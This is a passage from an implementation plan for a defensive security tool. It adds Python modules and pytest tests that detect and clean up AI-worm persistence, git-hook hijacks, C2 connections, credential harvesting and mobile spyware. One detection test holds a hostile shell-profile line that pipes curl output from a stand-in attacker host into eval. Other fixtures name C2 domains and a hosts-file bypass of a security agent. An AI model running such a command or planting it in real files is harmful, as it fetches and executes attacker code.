    """fix() should offer to reset core.hooksPath on high-confidence findings."""
    mod = _get_module()
    from rescue.models import CheckResult, Finding

    check = CheckResult(
        module_name="ai_worm_git_ssh",
        findings=[
            Finding(
                title="Git hooksPath hijacked",
                description="core.hooksPath set to /tmp/.hidden/hooks",
                severity=Severity.CRITICAL,
                category="security",
                data={
                    "check": "git_hookspath_hijack",
                    "confidence": "high",
                    "value": "/tmp/.hidden/hooks",
                },
            ),
        ],
    )

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=0)
        fix = mod.fix(check, Mode.MANUAL)

    assert len(fix.actions) > 0
    assert fix.actions[0].success


def test_subprocess_timeout_handled():
    mod = _get_module()
    import subprocess as sp

    with patch("subprocess.run", side_effect=sp.TimeoutExpired("cmd", 5)):
        with patch.object(Path, "exists", return_value=False):
            with patch.object(Path, "is_file", return_value=False):
                result = mod.check(_make_profile())
    assert not result.has_issues
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `python -m pytest tests/test_module_ai_worm_git_ssh.py -v`
Expected: FAIL — module not found

- [ ] **Step 3: Write the module implementation**

Implement `modules/security/ai_worm_git_ssh/__init__.py` with the following check methods:
- `_check_git_global_config()`: Run `git config --global core.hooksPath` and `git config --global init.templateDir`, flag non-standard values as `confidence: "high"`
- `_check_npmrc_override()`: Read `~/.npmrc` and any `.npmrc` in current/parent dirs, search for `git=node` line
- `_check_mcp_configs()`: Read `~/.claude/settings.json`, `~/.cursor/mcp.json`, `~/.continue/config.json`, parse JSON, check `mcpServers` keys against `iocs.mcp_servers`
- `_check_repo_hooks()`: Scan for `.claude/setup.mjs`, `.cursor/rules/setup.mdc`, `.vscode/tasks.json`, `.github/setup.js` in the current directory and common project directories
- `_check_ssh_authorized_keys()`: Read `~/.ssh/authorized_keys`, flag keys added within the last 7 days (based on file mtime — `confidence: "low"` as this is a heuristic)

Fix actions:
- `confidence == "high"`: Reset `core.hooksPath` via `git config --global --unset core.hooksPath`, reset `init.templateDir`, remove rogue MCP entries from config files, remove `.npmrc` `git=node` lines
- `confidence != "high"`: Informational guidance only

Follow the exact pattern from `ai_worm_filesystem` (Task 2) for the class structure, imports, and error handling.

- [ ] **Step 4: Run tests to verify they pass**

Run: `python -m pytest tests/test_module_ai_worm_git_ssh.py -v`
Expected: All tests PASS

- [ ] **Step 5: Commit**

```bash
git add modules/security/ai_worm_git_ssh/ tests/test_module_ai_worm_git_ssh.py
git commit -m "feat: add ai_worm_git_ssh module for git hook and MCP config detection"
```

---

### Task 4: `ai_worm_persistence` Module

**Files:**
- Create: `modules/security/ai_worm_persistence/__init__.py`
- Create: `tests/test_module_ai_worm_persistence.py`

**Interfaces:**
- Consumes: `load_iocs()` from Task 1 — uses `iocs.paths` for known persistence locations
- Produces: `Module` class with `name = "ai_worm_persistence"`, `risk_level = RiskLevel.DESTRUCTIVE`

- [ ] **Step 1: Write the failing tests**

```python
# tests/test_module_ai_worm_persistence.py
import sys
import os
from pathlib import Path
from unittest.mock import patch, MagicMock

sys.path.insert(0, str(Path(__file__).parent.parent))

from rescue.models import SystemProfile, Platform, Severity, RiskLevel, Mode
from rescue.registry import discover_modules


def _make_profile(platform=Platform.DARWIN):
    return SystemProfile(
        platform=platform,
        os_name="macOS",
        os_version="15.2",
        architecture="arm64",
        cpu_model="Apple M2",
        cpu_cores=8,
        ram_bytes=16 * 1024**3,
    )


def _get_module():
    modules_dir = Path(__file__).parent.parent / "modules"
    modules = discover_modules(modules_dir)
    return next(m for m in modules if m.name == "ai_worm_persistence")


def test_module_discovered():
    mod = _get_module()
    assert mod.name == "ai_worm_persistence"
    assert mod.category == "security"
    assert mod.risk_level == RiskLevel.DESTRUCTIVE
    assert Platform.DARWIN in mod.platforms


def test_clean_system_no_findings():
    mod = _get_module()
    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=0)
        with patch.object(Path, "exists", return_value=False):
            with patch.object(Path, "is_file", return_value=False):
                with patch.object(Path, "glob", return_value=[]):
                    result = mod.check(_make_profile())
    assert not result.has_issues


def test_detects_known_malicious_launchagent():
    """Detect Miasma's gh-token-monitor LaunchAgent."""
    mod = _get_module()

    plist_path = Path.home() / "Library" / "LaunchAgents" / "com.user.gh-token-monitor.plist"

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=0)
        with patch.object(Path, "exists") as mock_exists:
            mock_exists.side_effect = lambda: True
            with patch.object(
                mod,
                "_check_launchagents_darwin",
                return_value=[
                    {
                        "plist": str(plist_path),
                        "label": "com.user.gh-token-monitor",
                        "threat": "miasma",
                        "is_deadman_switch": True,
                    }
                ],
            ):
                result = mod.check(_make_profile())

    la_findings = [
        f for f in result.findings if f.data.get("check") == "malicious_launchagent"
    ]
    assert len(la_findings) > 0
    assert la_findings[0].severity == Severity.CRITICAL
    assert la_findings[0].data["confidence"] == "high"
    assert la_findings[0].data.get("is_deadman_switch") is True


def test_detects_shell_profile_injection():
    """Detect suspicious lines injected into shell profiles."""
    mod = _get_module()

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=0)
        with patch.object(Path, "exists", return_value=False):
            with patch.object(
                mod,
                "_check_shell_profiles",
                return_value=[
                    {
                        "file": "~/.bashrc",
                        "line": 'eval "$(curl -s https://evil.com/payload)"',
                        "line_number": 42,
                    }
                ],
            ):
                result = mod.check(_make_profile())

    shell_findings = [
        f for f in result.findings if f.data.get("check") == "shell_profile_injection"
    ]
    assert len(shell_findings) > 0
    assert shell_findings[0].data["confidence"] == "medium"


def test_fix_disables_deadman_switch_first():
    """fix() must disable dead-man switch BEFORE other remediation."""
    mod = _get_module()
    from rescue.models import CheckResult, Finding

    check = CheckResult(
        module_name="ai_worm_persistence",
        findings=[
            Finding(
                title="Miasma dead-man switch LaunchAgent",
                description="gh-token-monitor plist",
                severity=Severity.CRITICAL,
                category="security",
                data={
                    "check": "malicious_launchagent",
                    "confidence": "high",
                    "plist": str(
                        Path.home()
                        / "Library/LaunchAgents/com.user.gh-token-monitor.plist"
                    ),
                    "is_deadman_switch": True,
                    "threat": "miasma",
                },
            ),
            Finding(
                title="Miasma update-monitor LaunchAgent",
                description="update-monitor plist",
                severity=Severity.CRITICAL,
                category="security",
                data={
                    "check": "malicious_launchagent",
                    "confidence": "high",
                    "plist": str(
                        Path.home()
                        / "Library/LaunchAgents/com.user.update-monitor.plist"
                    ),
                    "is_deadman_switch": False,
                    "threat": "miasma",
                },
            ),
        ],
    )

    call_log = []

    def mock_run(cmd, **kwargs):
        call_log.append(cmd)
        return MagicMock(returncode=0)

    with patch("subprocess.run", side_effect=mock_run):
        with patch("os.remove"):
            fix = mod.fix(check, Mode.MANUAL)

    # Dead-man switch actions must come first
    assert len(fix.actions) >= 2
    deadman_idx = next(
        i for i, a in enumerate(fix.actions) if "dead-man" in a.title.lower() or "deadman" in a.title.lower()
    )
    other_idx = next(
        i
        for i, a in enumerate(fix.actions)
        if "update-monitor" in a.title.lower()
    )
    assert deadman_idx < other_idx


def test_subprocess_timeout_handled():
    mod = _get_module()
    import subprocess as sp

    with patch("subprocess.run", side_effect=sp.TimeoutExpired("cmd", 5)):
        with patch.object(Path, "exists", return_value=False):
            with patch.object(Path, "is_file", return_value=False):
                with patch.object(Path, "glob", return_value=[]):
                    result = mod.check(_make_profile())
    assert not result.has_issues
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `python -m pytest tests/test_module_ai_worm_persistence.py -v`
Expected: FAIL — module not found

- [ ] **Step 3: Write the module implementation**

Implement `modules/security/ai_worm_persistence/__init__.py` with:
- `_check_launchagents_darwin()`: Scan `~/Library/LaunchAgents/` for known malicious labels (`com.user.gh-token-monitor`, `com.user.update-monitor`) and heuristic scan for plists referencing `bun`, AI API endpoints, or suspicious programs. Tag `is_deadman_switch: True` for `gh-token-monitor`.
- `_check_systemd_linux()`: Check `~/.config/systemd/user/` for rogue units, check known paths from IOC database.
- `_check_scheduled_tasks_win()`: Run `schtasks /Query /FO CSV` and parse for tasks running scripts from `%TEMP%` or `%APPDATA%`.
- `_check_shell_profiles()`: Read `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`, `~/.profile`, search for `curl|wget` piped to shell, `eval` of encoded strings, sourcing from temp/hidden dirs. `confidence: "medium"` for heuristic matches.
- `_check_sessionstart_hooks()`: Read `~/.claude/settings.json`, check for hooks.SessionStart entries. Only flag as `confidence: "high"` if the hook command matches known malicious patterns from IOC database; otherwise `confidence: "low"` (users legitimately use SessionStart hooks).

Fix ordering: dead-man switch findings sorted first. Fix implementation:
- Dead-man switch: `launchctl unload <plist>` (macOS) or `systemctl --user stop gh-token-monitor` (Linux), then remove the plist/unit file. Include prominent warning in action description.
- Other persistence: `launchctl unload` + remove plist, `systemctl --user disable` + remove unit, remove injected shell profile lines, remove rogue hooks.
- All actions `RiskLevel.DESTRUCTIVE`, `confidence == "high"` only.

- [ ] **Step 4: Run tests to verify they pass**

Run: `python -m pytest tests/test_module_ai_worm_persistence.py -v`
Expected: All tests PASS

- [ ] **Step 5: Commit**

```bash
git add modules/security/ai_worm_persistence/ tests/test_module_ai_worm_persistence.py
git commit -m "feat: add ai_worm_persistence module with dead-man switch detection"
```

---

### Task 5: `ai_worm_network` Module

**Files:**
- Create: `modules/security/ai_worm_network/__init__.py`
- Create: `tests/test_module_ai_worm_network.py`

**Interfaces:**
- Consumes: `load_iocs()` from Task 1 — uses `iocs.domains`, `iocs.ips`
- Produces: `Module` class with `name = "ai_worm_network"`

- [ ] **Step 1: Write the failing tests**

```python
# tests/test_module_ai_worm_network.py
import sys
import os
from pathlib import Path
from unittest.mock import patch, MagicMock

sys.path.insert(0, str(Path(__file__).parent.parent))

from rescue.models import SystemProfile, Platform, Severity, RiskLevel, Mode
from rescue.registry import discover_modules


def _make_profile(platform=Platform.DARWIN):
    return SystemProfile(
        platform=platform,
        os_name="macOS",
        os_version="15.2",
        architecture="arm64",
        cpu_model="Apple M2",
        cpu_cores=8,
        ram_bytes=16 * 1024**3,
    )


def _get_module():
    modules_dir = Path(__file__).parent.parent / "modules"
    modules = discover_modules(modules_dir)
    return next(m for m in modules if m.name == "ai_worm_network")


def test_module_discovered():
    mod = _get_module()
    assert mod.name == "ai_worm_network"
    assert mod.category == "security"
    assert mod.risk_level == RiskLevel.MODERATE


def test_clean_system_no_findings():
    mod = _get_module()
    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=0)
        with patch.object(Path, "exists", return_value=False):
            result = mod.check(_make_profile())
    assert not result.has_issues


def test_detects_known_malicious_domain_connection():
    """Detect process connecting to known malicious domain."""
    mod = _get_module()

    lsof_output = (
        "COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\n"
        "node    99999   user   10u  IPv4 0x1234 0t0 TCP "
        "192.168.1.1:50000->cdn.cloudfront-js.com:443 (ESTABLISHED)"
    )

    with patch("subprocess.run") as mock_run:
        mock_result = MagicMock()
        mock_result.stdout = lsof_output
        mock_result.returncode = 0

        def side_effect(cmd, **kwargs):
            if cmd[0] == "lsof":
                return mock_result
            return MagicMock(stdout="", returncode=0)

        mock_run.side_effect = side_effect

        with patch.object(Path, "exists", return_value=False):
            result = mod.check(_make_profile())

    domain_findings = [
        f for f in result.findings if f.data.get("check") == "known_malicious_connection"
    ]
    assert len(domain_findings) > 0
    assert domain_findings[0].severity == Severity.CRITICAL
    assert domain_findings[0].data["confidence"] == "high"


def test_detects_stepsecurity_bypass():
    """Detect /etc/hosts entry redirecting agent.stepsecurity.io."""
    mod = _get_module()

    hosts_content = "127.0.0.1 localhost\n127.0.0.1 agent.stepsecurity.io\n"

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=0)
        with patch(
            "builtins.open",
            MagicMock(
                return_value=MagicMock(
                    __enter__=MagicMock(
                        return_value=MagicMock(
                            read=MagicMock(return_value=hosts_content)
                        )
                    ),
                    __exit__=MagicMock(return_value=False),
                )
            ),
        ):
            with patch.object(Path, "exists", return_value=True):
                with patch.object(
                    mod,
                    "_check_stepsecurity_bypass",
                    return_value=[{"line": "127.0.0.1 agent.stepsecurity.io"}],
                ):
                    result = mod.check(_make_profile())

    bypass_findings = [
        f for f in result.findings if f.data.get("check") == "stepsecurity_bypass"
    ]
    assert len(bypass_findings) > 0
    assert bypass_findings[0].data["confidence"] == "high"


def test_detects_beaconing_pattern():
    """Detect processes with regular-interval outbound connections."""
    mod = _get_module()

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=0)
        with patch.object(Path, "exists", return_value=False):
            with patch.object(
                mod,
                "_check_beaconing",
                return_value=[
                    {
                        "process": "gh-token-monitor",
                        "pid": 12345,
                        "dest": "api.github.com:443",
                        "interval_seconds": 60,
                    }
                ],
            ):
                result = mod.check(_make_profile())

    beacon_findings = [
        f for f in result.findings if f.data.get("check") == "beaconing_detected"
    ]
    assert len(beacon_findings) > 0
    assert beacon_findings[0].data["confidence"] == "medium"


def test_fix_kills_malicious_connection():
    mod = _get_module()
    from rescue.models import CheckResult, Finding

    check = CheckResult(
        module_name="ai_worm_network",
        findings=[
            Finding(
                title="Connection to known C2",
                description="node connecting to malicious domain",
                severity=Severity.CRITICAL,
                category="security",
                data={
                    "check": "known_malicious_connection",
                    "confidence": "high",
                    "pid": 99999,
                    "process": "node",
                },
            ),
        ],
    )

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=0)
        with patch("os.kill"):
            fix = mod.fix(check, Mode.MANUAL)

    assert len(fix.actions) > 0
    assert fix.actions[0].success


def test_subprocess_timeout_handled():
    mod = _get_module()
    import subprocess as sp

    with patch("subprocess.run", side_effect=sp.TimeoutExpired("cmd", 5)):
        with patch.object(Path, "exists", return_value=False):
            result = mod.check(_make_profile())
    assert not result.has_issues
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `python -m pytest tests/test_module_ai_worm_network.py -v`
Expected: FAIL — module not found

- [ ] **Step 3: Write the module implementation**

Implement `modules/security/ai_worm_network/__init__.py` with:
- `_check_active_connections()`: Run `lsof -i -n -P` (macOS/Linux) or `netstat -b` (Windows), parse output, match against `iocs.domains` and `iocs.ips`. Connections to known malicious infra → `confidence: "high"`.
- `_check_stepsecurity_bypass()`: Read `/etc/hosts`, search for `agent.stepsecurity.io` entries. `confidence: "high"`.
- `_check_beaconing()`: Run `lsof -i -n -P` twice with a 5-second gap, look for processes with identical connections in both samples (suggests periodic polling). `confidence: "medium"`.
- `_check_token_harvesting_subprocess()`: Run `ps aux`, look for `bun`/`node`/`python` processes whose command line contains `gh auth token`. `confidence: "high"` — this is a specific Miasma signature.

Fix actions:
- `confidence == "high"`: `os.kill(pid, signal.SIGTERM)` for malicious connections, remove `/etc/hosts` bypass entries
- `confidence != "high"`: Informational

- [ ] **Step 4: Run tests to verify they pass**

Run: `python -m pytest tests/test_module_ai_worm_network.py -v`
Expected: All tests PASS

- [ ] **Step 5: Commit**

```bash
git add modules/security/ai_worm_network/ tests/test_module_ai_worm_network.py
git commit -m "feat: add ai_worm_network module for C2 and exfiltration detection"
```

---

### Task 6: `ai_worm_lateral` Module

**Files:**
- Create: `modules/security/ai_worm_lateral/__init__.py`
- Create: `tests/test_module_ai_worm_lateral.py`

**Interfaces:**
- Consumes: `load_iocs()` from Task 1 — uses `iocs.paths` for credential file locations, `iocs.hashes` for known payloads
- Produces: `Module` class with `name = "ai_worm_lateral"`

- [ ] **Step 1: Write the failing tests**

```python
# tests/test_module_ai_worm_lateral.py
import sys
import os
from pathlib import Path
from unittest.mock import patch, MagicMock

sys.path.insert(0, str(Path(__file__).parent.parent))

from rescue.models import SystemProfile, Platform, Severity, RiskLevel, Mode
from rescue.registry import discover_modules


def _make_profile(platform=Platform.DARWIN):
    return SystemProfile(
        platform=platform,
        os_name="macOS",
        os_version="15.2",
        architecture="arm64",
        cpu_model="Apple M2",
        cpu_cores=8,
        ram_bytes=16 * 1024**3,
    )


def _get_module():
    modules_dir = Path(__file__).parent.parent / "modules"
    modules = discover_modules(modules_dir)
    return next(m for m in modules if m.name == "ai_worm_lateral")


def test_module_discovered():
    mod = _get_module()
    assert mod.name == "ai_worm_lateral"
    assert mod.category == "security"
    assert mod.risk_level == RiskLevel.MODERATE


def test_clean_system_no_findings():
    mod = _get_module()
    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=0)
        with patch.object(Path, "exists", return_value=False):
            with patch.object(Path, "is_file", return_value=False):
                result = mod.check(_make_profile())
    assert not result.has_issues


def test_detects_stolen_credential_file():
    """Detect Miasma stolen PAT storage file."""
    mod = _get_module()

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=0)
        with patch.object(
            mod,
            "_check_credential_harvesting",
            return_value=[
                {
                    "path": str(Path.home() / ".config/gh-token-monitor/token"),
                    "threat": "miasma",
                    "ioc_match": True,
                }
            ],
        ):
            result = mod.check(_make_profile())

    cred_findings = [
        f
        for f in result.findings
        if f.data.get("check") == "credential_harvesting"
    ]
    assert len(cred_findings) > 0
    assert cred_findings[0].data["confidence"] == "high"


def test_detects_shai_halud_workflow():
    """Detect shai-hulud-workflow.yml in repos."""
    mod = _get_module()

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=0)
        with patch.object(Path, "exists", return_value=False):
            with patch.object(
                mod,
                "_check_supply_chain_artifacts",
                return_value=[
                    {
                        "path": "/Users/dev/project/.github/workflows/shai-hulud-workflow.yml",
                        "threat": "shai_hulud",
                        "type": "workflow",
                    }
                ],
            ):
                result = mod.check(_make_profile())

    sc_findings = [
        f
        for f in result.findings
        if f.data.get("check") == "supply_chain_artifact"
    ]
    assert len(sc_findings) > 0
    assert sc_findings[0].severity == Severity.CRITICAL


def test_detects_imds_access():
    """Detect processes querying cloud instance metadata service."""
    mod = _get_module()

    lsof_output = (
        "COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME\n"
        "python3 12345 user 10u IPv4 0x1234 0t0 TCP "
        "10.0.0.1:50000->169.254.169.254:80 (ESTABLISHED)"
    )

    with patch("subprocess.run") as mock_run:
        mock_result = MagicMock()
        mock_result.stdout = lsof_output
        mock_result.returncode = 0

        def side_effect(cmd, **kwargs):
            if cmd[0] == "lsof":
                return mock_result
            return MagicMock(stdout="", returncode=0)

        mock_run.side_effect = side_effect

        with patch.object(Path, "exists", return_value=False):
            with patch.object(Path, "is_file", return_value=False):
                result = mod.check(_make_profile())

    imds_findings = [
        f for f in result.findings if f.data.get("check") == "imds_access"
    ]
    assert len(imds_findings) > 0
    assert imds_findings[0].data["confidence"] == "medium"


def test_fix_provides_rotation_guidance():
    mod = _get_module()
    from rescue.models import CheckResult, Finding

    check = CheckResult(
        module_name="ai_worm_lateral",
        findings=[
            Finding(
                title="Stolen credential file",
                description="Miasma PAT storage",
                severity=Severity.CRITICAL,
                category="security",
                data={
                    "check": "credential_harvesting",
                    "confidence": "high",
                    "path": str(
                        Path.home() / ".config/gh-token-monitor/token"
                    ),
                    "threat": "miasma",
                },
            ),
        ],
    )

    with patch("os.remove"):
        fix = mod.fix(check, Mode.MANUAL)

    assert len(fix.actions) > 0
    # Should include guidance about credential rotation
    action_text = " ".join(a.description for a in fix.actions).lower()
    assert "rotat" in action_text or "revok" in action_text


def test_subprocess_timeout_handled():
    mod = _get_module()
    import subprocess as sp

    with patch("subprocess.run", side_effect=sp.TimeoutExpired("cmd", 5)):
        with patch.object(Path, "exists", return_value=False):
            with patch.object(Path, "is_file", return_value=False):
                result = mod.check(_make_profile())
    assert not result.has_issues
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `python -m pytest tests/test_module_ai_worm_lateral.py -v`
Expected: FAIL — module not found

- [ ] **Step 3: Write the module implementation**

Implement `modules/security/ai_worm_lateral/__init__.py` with:
- `_check_credential_harvesting()`: Check for known credential storage files from IOC database (e.g., `~/.config/gh-token-monitor/token`). For IOC-matched paths → `confidence: "high"`. Do NOT flag standard credential files (`~/.aws/credentials`, `~/.ssh/id_rsa`) just for existing — that's normal. Only flag them if there's a corroborating signal (recent atime from a non-standard process, file permissions changed).
- `_check_supply_chain_artifacts()`: Scan current directory and `~/src/`, `~/projects/`, `~/code/` for `.github/workflows/shai-hulud-workflow.yml`, `setup_bun.js`, `bun_environment.js` in package directories.
- `_check_imds_access()`: Run `lsof -i -n -P`, search for connections to `169.254.169.254` from non-cloud-CLI processes. `confidence: "medium"`.
- `_check_npm_publish_history()`: Run `npm whoami` and `npm profile get` to check if npm credentials are active, informational only.

Fix actions:
- `confidence == "high"`: Remove known malicious files (stolen credential storage), remove supply chain artifacts (malicious workflows, payload files)
- All findings: Include credential rotation guidance in action descriptions

- [ ] **Step 4: Run tests to verify they pass**

Run: `python -m pytest tests/test_module_ai_worm_lateral.py -v`
Expected: All tests PASS

- [ ] **Step 5: Commit**

```bash
git add modules/security/ai_worm_lateral/ tests/test_module_ai_worm_lateral.py
git commit -m "feat: add ai_worm_lateral module for lateral movement and supply chain detection"
```

---

### Task 7: `mvt_spyware_scan` Module

**Files:**
- Create: `modules/security/mvt_spyware_scan/__init__.py`
- Create: `tests/test_module_mvt_spyware_scan.py`

**Interfaces:**
- Consumes: External `mvt` CLI tool (optional dependency)
- Produces: `Module` class with `name = "mvt_spyware_scan"`, `risk_level = RiskLevel.SAFE`

- [ ] **Step 1: Write the failing tests**

```python
# tests/test_module_mvt_spyware_scan.py
import sys
import json
from pathlib import Path
from unittest.mock import patch, MagicMock

sys.path.insert(0, str(Path(__file__).parent.parent))

from rescue.models import SystemProfile, Platform, Severity, RiskLevel, Mode
from rescue.registry import discover_modules


def _make_profile(platform=Platform.DARWIN):
    return SystemProfile(
        platform=platform,
        os_name="macOS",
        os_version="15.2",
        architecture="arm64",
        cpu_model="Apple M2",
        cpu_cores=8,
        ram_bytes=16 * 1024**3,
    )


def _get_module():
    modules_dir = Path(__file__).parent.parent / "modules"
    modules = discover_modules(modules_dir)
    return next(m for m in modules if m.name == "mvt_spyware_scan")


def test_module_discovered():
    mod = _get_module()
    assert mod.name == "mvt_spyware_scan"
    assert mod.category == "security"
    assert mod.risk_level == RiskLevel.SAFE
    assert Platform.DARWIN in mod.platforms
    assert Platform.LINUX in mod.platforms


def test_no_backups_no_findings():
    """No findings when no device backups are found."""
    mod = _get_module()
    with patch.object(Path, "exists", return_value=False):
        with patch.object(Path, "is_dir", return_value=False):
            result = mod.check(_make_profile())
    # Should report info that no backups were found, not an error
    assert not any(f.severity == Severity.CRITICAL for f in result.findings)


def test_mvt_not_installed_reports_info():
    """When MVT is not installed, report as informational finding."""
    mod = _get_module()

    with patch.object(Path, "exists", return_value=True):
        with patch.object(Path, "is_dir", return_value=True):
            with patch.object(Path, "iterdir", return_value=[Path("/fake/backup")]):
                with patch("shutil.which", return_value=None):
                    result = mod.check(_make_profile())

    mvt_findings = [
        f for f in result.findings if f.data.get("check") == "mvt_not_installed"
    ]
    assert len(mvt_findings) > 0
    assert mvt_findings[0].severity == Severity.INFO


def test_mvt_scan_with_detection():
    """When MVT finds spyware indicators, report as critical findings."""
    mod = _get_module()

    mvt_output = json.dumps(
        [
            {
                "module": "safari_history",
                "detected": True,
                "indicator": "suspicious-domain.com",
                "matched_indicator": {
                    "type": "domain-name",
                    "value": "suspicious-domain.com",
                },
            }
        ]
    )

    with patch.object(Path, "exists", return_value=True):
        with patch.object(Path, "is_dir", return_value=True):
            with patch.object(
                Path, "iterdir", return_value=[Path("/fake/backup/abc123")]
            ):
                with patch("shutil.which", return_value="/usr/local/bin/mvt-ios"):
                    with patch("subprocess.run") as mock_run:
                        mock_result = MagicMock()
                        mock_result.returncode = 0
                        mock_result.stdout = ""
                        mock_run.return_value = mock_result
                        with patch.object(
                            mod,
                            "_parse_mvt_output",
                            return_value=[
                                {
                                    "module": "safari_history",
                                    "indicator": "suspicious-domain.com",
                                    "indicator_type": "domain-name",
                                }
                            ],
                        ):
                            result = mod.check(_make_profile())

    spyware_findings = [
        f for f in result.findings if f.data.get("check") == "mvt_spyware_detected"
    ]
    assert len(spyware_findings) > 0
    assert spyware_findings[0].severity == Severity.CRITICAL


def test_fix_provides_guidance():
    """fix() provides informational guidance for spyware remediation."""
    mod = _get_module()
    from rescue.models import CheckResult, Finding

    check = CheckResult(
        module_name="mvt_spyware_scan",
        findings=[
            Finding(
                title="Spyware indicator detected",
                description="Pegasus indicator in safari_history",
                severity=Severity.CRITICAL,
                category="security",
                data={
                    "check": "mvt_spyware_detected",
                    "module": "safari_history",
                    "indicator": "suspicious-domain.com",
                },
            ),
        ],
    )

    fix = mod.fix(check, Mode.MANUAL)

    assert len(fix.actions) > 0
    assert fix.all_succeeded
    action_text = " ".join(a.description for a in fix.actions).lower()
    assert "factory reset" in action_text or "update" in action_text


def test_windows_reports_wsl_requirement():
    """On Windows, report that MVT requires WSL."""
    mod = _get_module()
    result = mod.check(_make_profile(platform=Platform.WIN32))

    wsl_findings = [
        f for f in result.findings if f.data.get("check") == "mvt_requires_wsl"
    ]
    assert len(wsl_findings) > 0
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `python -m pytest tests/test_module_mvt_spyware_scan.py -v`
Expected: FAIL — module not found

- [ ] **Step 3: Write the module implementation**

Implement `modules/security/mvt_spyware_scan/__init__.py` with:
- `check()`:
  1. On Windows, return INFO finding that MVT requires WSL
  2. Discover iOS backups at platform-specific locations (`~/Library/Application Support/MobileSync/Backup/` on macOS)
  3. Check if `mvt-ios` or `mvt-android` is installed via `shutil.which()`
  4. If not installed, return INFO finding with install instructions (`pip install mvt`)
  5. If installed and backups found, run `mvt-ios check-backup --output <tmpdir> <backup_path>` via `subprocess.run`
  6. Parse MVT's JSON output files in the output directory via `_parse_mvt_output()`
  7. Convert detections to CRITICAL findings
- `fix()`: Informational only — factory reset guidance, OS update instructions, Lockdown Mode recommendation, Amnesty International Security Lab resources link
- `_parse_mvt_output(output_dir)`: Read JSON files from MVT output directory, extract entries where `detected == True`
- Include caveat in any clean-scan finding: "Absence of findings does NOT guarantee the device is clean"

- [ ] **Step 4: Run tests to verify they pass**

Run: `python -m pytest tests/test_module_mvt_spyware_scan.py -v`
Expected: All tests PASS

- [ ] **Step 5: Commit**

```bash
git add modules/security/mvt_spyware_scan/ tests/test_module_mvt_spyware_scan.py
git commit -m "feat: add mvt_spyware_scan module for mobile spyware detection"
```

---

### Task 8: Threat Profile + Integration Test

**Files:**
- Create: `profiles/ai_worm_response.yaml`
- Create: `tests/test_ai_worm_profile.py`

**Interfaces:**
- Consumes: All six modules from Tasks 2-7, profile system from `rescue/profiles.py`
- Produces: Working threat profile that activates all AI worm modules together

- [ ] **Step 1: Write the profile integration test**

```python
# tests/test_ai_worm_profile.py
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from rescue.models import Platform
from rescue.registry import discover_modules, filter_by_platform
from rescue.profiles import load_profile, filter_modules_by_profile


def test_profile_loads():
    """ai_worm_response profile loads without errors."""
    profile_path = Path(__file__).parent.parent / "profiles" / "ai_worm_response.yaml"
    profile = load_profile(profile_path)
    assert profile.name == "ai_worm_response"
    assert profile.display_name == "AI Worm & Spyware Response"


def test_profile_includes_all_modules():
    """Profile includes all six AI worm detection modules."""
    profile_path = Path(__file__).parent.parent / "profiles" / "ai_worm_response.yaml"
    profile = load_profile(profile_path)

    expected = {
        "ai_worm_filesystem",
        "ai_worm_git_ssh",
        "ai_worm_persistence",
        "ai_worm_network",
        "ai_worm_lateral",
        "mvt_spyware_scan",
    }
    assert set(profile.include_modules) == expected


def test_profile_filters_modules():
    """Profile correctly filters discovered modules to only the AI worm pack."""
    profile_path = Path(__file__).parent.parent / "profiles" / "ai_worm_response.yaml"
    profile = load_profile(profile_path)

    modules_dir = Path(__file__).parent.parent / "modules"
    all_modules = discover_modules(modules_dir)
    filtered = filter_modules_by_profile(all_modules, profile)

    filtered_names = {m.name for m in filtered}
    expected = {
        "ai_worm_filesystem",
        "ai_worm_git_ssh",
        "ai_worm_persistence",
        "ai_worm_network",
        "ai_worm_lateral",
        "mvt_spyware_scan",
    }
    assert filtered_names == expected


def test_all_modules_discoverable():
    """All six modules are discovered by the registry."""
    modules_dir = Path(__file__).parent.parent / "modules"
    all_modules = discover_modules(modules_dir)
    module_names = {m.name for m in all_modules}

    expected = {
        "ai_worm_filesystem",
        "ai_worm_git_ssh",
        "ai_worm_persistence",
        "ai_worm_network",
        "ai_worm_lateral",
        "mvt_spyware_scan",
    }
    assert expected.issubset(module_names)


def test_module_config_sensitivity():
    """Profile provides sensitivity config for AI worm modules."""
    profile_path = Path(__file__).parent.parent / "profiles" / "ai_worm_response.yaml"
    profile = load_profile(profile_path)

    for module_name in [
        "ai_worm_filesystem",
        "ai_worm_git_ssh",
        "ai_worm_persistence",
        "ai_worm_network",
        "ai_worm_lateral",
    ]:
        assert module_name in profile.module_config
        assert profile.module_config[module_name]["sensitivity"] == "elevated"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `python -m pytest tests/test_ai_worm_profile.py -v`
Expected: FAIL — profile file not found

- [ ] **Step 3: Create the profile YAML**

```yaml
# profiles/ai_worm_response.yaml
name: ai_worm_response
display_name: "AI Worm & Spyware Response"
description: >
  Comprehensive scan for AI-led worm compromise (Shai Halud, Miasma,
  SANDWORM_MODE, SesameOp) and mobile spyware. Checks filesystem
  artifacts, git/SSH integrity, persistence mechanisms, network C2,
  lateral movement indicators, and mobile device backups.
modules:
  include:
    - ai_worm_filesystem
    - ai_worm_git_ssh
    - ai_worm_persistence
    - ai_worm_network
    - ai_worm_lateral
    - mvt_spyware_scan
  exclude: []
module_config:
  ai_worm_filesystem:
